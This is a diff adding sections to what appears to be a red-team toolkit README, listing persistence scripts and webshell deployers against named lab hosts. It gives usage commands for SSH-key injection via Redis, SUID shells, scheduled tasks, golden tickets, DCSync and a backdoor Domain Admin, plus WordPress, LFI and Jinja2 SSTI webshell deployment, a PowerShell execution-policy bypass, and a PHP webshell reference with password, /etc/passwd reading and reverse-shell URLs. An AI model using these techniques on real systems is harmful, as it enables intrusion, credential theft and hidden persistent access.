@@ -157,3 +157,59 @@
 - install pihole to sinkhole github
 - 20 Docker binaries all running as hidden services
 - Fix the install-yay script
+
+---
+
+## persist/ — Deep Persistence Scripts
+
+| Script | Targets | Methods |
+|--------|---------|---------|
+| `persist/linux_persist.sh` | svc-ftp-01, svc-redis-01, svc-database-01, svc-amazin-01, svc-samba-01 | SSH authorized_keys, cron, systemd service, SUID bash copy, .bashrc hook |
+| `persist/redis_persist.sh` | svc-redis-01, svc-database-01 | Redis RDB write → SSH key injection + /etc/cron.d write |
+| `persist/windows_persist.ps1` | svc-ad-01, svc-smb-01 | Scheduled task (SYSTEM), reg Run key, WMI event sub, startup folder VBS, hidden service |
+| `persist/ad_persist.sh` | svc-ad-01 | DCSync, golden ticket, backdoor Domain Admin, AdminSDHolder ACL, DNS record injection |
+
+```bash
+# Linux (any Ubuntu host)
+./persist/linux_persist.sh <target_ip> <user> <pass> <lhost> <lport>
+
+# Redis (unauthenticated open Redis)
+./persist/redis_persist.sh <target_ip>
+
+# AD (after getting DA creds)
+./persist/ad_persist.sh <dc_ip> <domain.local> Administrator <pass> <lhost>
+
+# Windows (run on a PS shell on target, or via CrackMapExec -X)
+#   powershell -ep bypass -File persist/windows_persist.ps1 -LHost <lhost> -LPort 4446
+```
+
+## webshells/ — Webshell Deployers
+
+| Script | Target | Technique |
+|--------|--------|-----------|
+| `webshells/shell.php` | WP/LAMP hosts | Feature-rich PHP webshell (cmd / upload / read / revshell) |
+| `webshells/deploy_wordpress_shell.sh` | svc-amazin-01 (WP 5.8.1) | Theme 404.php injection, malicious plugin upload, XML-RPC probe |
+| `webshells/deploy_lamp_shell.sh` | svc-samba-01 (LAMP) | Samba→webroot write, LFI+log poisoning, PHPMyAdmin SELECT INTO OUTFILE |
+| `webshells/deploy_nginx_flask_shell.sh` | svc-redis-01 (Flask/Nginx) | Jinja2 SSTI→RCE, Redis session forgery, Nginx alias traversal, Werkzeug debug console |
+
+```bash
+chmod +x webshells/*.sh persist/*.sh
+
+# WordPress
+./webshells/deploy_wordpress_shell.sh <target_ip> admin <pass>
+
+# LAMP
+./webshells/deploy_lamp_shell.sh <target_ip> guest ""
+
+# Flask/Nginx
+./webshells/deploy_nginx_flask_shell.sh <target_ip> 80 6379 <lhost>
+```
+
+### shell.php quick ref (password: `rt2025!delta` — change before use)
+
+| Action | URL |
+|--------|-----|
+| Command | `?p=rt2025!delta&c=id` |
+| Read file | `?p=rt2025!delta&act=read&f=/etc/passwd` |
+| Upload | `POST ?p=rt2025!delta&act=upload` |
+| Rev shell | `?p=rt2025!delta&act=revshell&rh=LHOST&rp=4444` |
